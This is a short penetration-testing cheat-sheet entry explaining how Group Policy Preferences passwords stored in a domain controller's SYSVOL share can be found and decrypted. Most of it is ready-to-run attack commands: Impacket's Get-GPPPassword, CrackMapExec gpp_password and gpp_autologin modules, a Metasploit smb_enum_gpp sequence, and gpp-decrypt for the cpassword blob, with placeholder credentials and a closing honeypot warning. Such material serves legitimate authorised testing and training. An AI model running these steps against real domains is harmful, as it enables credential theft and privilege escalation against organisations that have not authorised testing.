**GPP passwords** — up to Windows Vista / Server 2008, admins could set passwords through Group Policy Preferences (e.g. to deploy a local admin or service account). These are stored as XML in the DC's SYSVOL share, encrypted with AES256 using a **single key that Microsoft published** - so any domain user can decode them and often escalate.

## Discovery

**Method 1: Manual** - browse a DC's `SYSVOL` share for XML files with a non-empty `cpassword="..."` attribute.

**Method 2: Impacket**

```bash

Get-GPPPassword.py 'DOMAIN/USER_NAME:USER_PASS@DC_IP'

```

**Method 3: CrackMapExec**

```bash

cme smb DC_IP -u 'USER_NAME' -p 'USER_PASS' -M gpp_password
cme smb DC_IP -u 'USER_NAME' -p 'USER_PASS' -M gpp_autologin

```

**Method 4: Metasploit**

```txt

use auxiliary/scanner/smb/smb_enum_gpp
set RHOSTS DC_IP
set SMBDomain DOMAIN
set SMBUser USER_NAME
set SMBPass USER_PASS
run

```

## Exploitation

Decode the `cpassword` blob (Kali ships `gpp-decrypt`):

```bash

gpp-decrypt BASE64

```

## Caution

**Warning:** You should not find GPP credentials on a recent AD. If you do, it might be a honeypot.

## References

- Impacket - https://github.com/fortra/impacket
- CrackMapExec - https://github.com/byt3bl33d3r/CrackMapExec
- The Hacker Recipes - GPP - https://www.thehacker.recipes/ad/movement/credentials/dumping/group-policies-preferences
